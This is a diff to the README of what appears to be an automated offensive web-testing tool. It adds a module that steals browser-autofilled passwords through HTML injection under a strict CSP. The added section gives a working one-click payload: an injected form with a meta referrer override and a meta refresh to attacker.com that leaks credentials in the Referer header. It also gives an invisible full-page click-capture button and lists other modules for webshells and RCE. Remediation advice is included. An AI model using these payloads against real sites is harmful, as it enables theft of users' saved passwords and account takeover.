@@ -621,6 +621,122 @@ redis-cli -h TARGET -p 6379 FCALL slow 0
 
 ---
 
+### HTML Injection + Chrome Password Autofill → CSP Bypass Password Theft (v2.1)
+
+> **Research basis:**  
+> [Rafał Wójcicki (AFINE) — "Stealing Passwords via HTML Injection Under a Strict CSP"](https://afine.com/blogs/stealing-passwords-via-html-injection-under-a-strict-csp)  
+> Published: May 26, 2026  
+> **Skill module:** `HtmlAutofillSteal` (id: 49)
+
+**Key insight:**
+
+A strict Content-Security-Policy (`script-src 'none'`, `default-src 'none'`) **blocks XSS** but does **NOT** block:
+- HTML injection (planting a fake form)
+- `<meta http-equiv="Refresh">` redirects
+- `<meta name="referrer" content="unsafe-url">` overrides
+- Chrome password autofill filling any matching form on the domain
+
+This enables **password exfiltration without any JavaScript**, even on maximally hardened pages.
+
+**Attack chain:**
+
+```
+① Reflected HTML injection found in GET parameter
+   GET /?html=<b>test</b>  →  <b>test</b> rendered in response
+
+② Inject fake login form (email + password fields)
+   Chrome password manager auto-fills saved credentials for the domain
+
+③ Form submitted via GET → credentials appear in URL as query params
+   /?email=victim@gmail.com&password=S3cr3tP@ss
+
+④ Override Referrer-Policy via injected <meta> tag
+   <meta name="referrer" content="unsafe-url">
+   → Chrome sends full URL (including password) in Referer header
+
+⑤ Meta-refresh redirect to attacker's server
+   <meta http-equiv="Refresh" content="0,url=https://attacker.com">
+   → Attacker's server receives: Referer: /?email=victim@...&password=S3cr3tP@ss
+
+⑥ Result: saved password exfiltrated via single user click
+```
+
+**Why browsers are exploitable:**
+
+| Browser | No policy | `no-referrer` set |
+|---------|-----------|-------------------|
+| Chrome | Full URL leaked for `<img>`, `<script>`, `<a>`, `<meta>` refresh | Full URL still leaked (Chrome ignores policy on `<meta>`) |
+| Firefox | Only `<a>` + `<meta>` refresh leak full URL | Same as no-policy |
+| Safari | Only `<a>` + `<meta>` refresh leak full URL | Same as no-policy |
+
+**Chrome is most dangerous** — fills saved credentials regardless of `form action` domain.
+
+**AI auto-trigger conditions** (bingo activates automatically):
+
+| Condition | Detection method |
+|-----------|-----------------|
+| `login`, `signin`, `auth` in target URL | URL keyword scan |
+| Login form (`type=email` + `type=password`) in HTML body | Body analysis |
+| GET parameter reflects HTML (any tag rendered) | Active probe with `<b>BINGO_PROBE</b>` |
+| CSP `script-src 'none'` detected | Header analysis |
+
+**Finding types and evidence levels:**
+
+| Finding | Evidence Level | Severity |
+|---------|---------------|----------|
+| `csp_detected` | `VERIFIED` (response header) | High |
+| `login_form_found` | `VERIFIED` (body analysis) | Info |
+| `html_injection_found` | `VERIFIED` (payload reflected in response) | High |
+| `csp_bypassed_via_html` | `VERIFIED` (strict CSP + injection confirmed) | Critical |
+| `referrer_policy_override` | `VERIFIED`/`LIKELY` | High |
+| `autofill_steal_exploitable` | `VERIFIED` (full chain confirmed) | Critical |
+| `autofill_steal_likely` | `LIKELY` | High |
+
+**Auto-generated PoC (1-click password theft):**
+
+```bash
+# Stage 1: Visit this URL as victim (Chrome autofills saved password)
+# On form submit, redirected to stage 2 with credentials in URL
+
+http://target.com/?html=
+  <form action="/">
+    <input type=email name=email />
+    <input type=password name=password />
+    <input name=html value='/?html=
+      <meta name="referrer" content="unsafe-url">
+      <meta http-equiv="Refresh" content="0,url=https://attacker.com" />' />
+    <input type=submit />
+  </form>
+
+# Stage 2 (attacker server receives):
+# GET / HTTP/1.1
+# Host: attacker.com
+# Referer: http://target.com/?email=victim@gmail.com&password=S3cr3tP@ss
+```
+
+**CSS full-page variant (1-click anywhere, requires `style-src unsafe-inline`):**
+
+```html
+<input type=submit style="position:fixed;top:0;left:0;
+  width:100vw;height:100vh;z-index:999999;opacity:0"/>
+```
+→ Invisible full-page button — victim clicks **anywhere** on the page.
+
+**Requirements:**
+
+1. Reflected HTML injection in any GET parameter (XSS NOT required)
+2. Login form on same domain with credentials saved in browser
+3. Works with any CSP, including `script-src 'none'; default-src 'none'`
+
+**Remediation (auto-included in report):**
+1. **Fix HTML injection at source** — contextually encode all reflected output (HTML Entity encoding)
+2. **Force POST on login forms** — never allow `method="GET"` for password fields
+3. **Explicit `Referrer-Policy: no-referrer`** — set in HTTP response headers (not just `<meta>`)
+4. **Never put credentials in URLs** — GET parameters appear in server logs, proxy logs, browser history
+5. **Treat HTML injection as Critical** — even without XSS, it enables credential theft
+
+---
+
 ### CSWSH + EXE Exposure + Localhost WebSocket RCE Chain (v2.1)
 
 > **Research basis:**  
@@ -963,7 +1079,7 @@ bingo/
 - **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
 - **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
 - **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
-- **48 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48)
+- **49 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47), RedisDarkReplica (#48), HtmlAutofillSteal (#49)
 - Production-stable (`Development Status :: 5 - Production/Stable`)
 
 ### v2.0.x — Beta
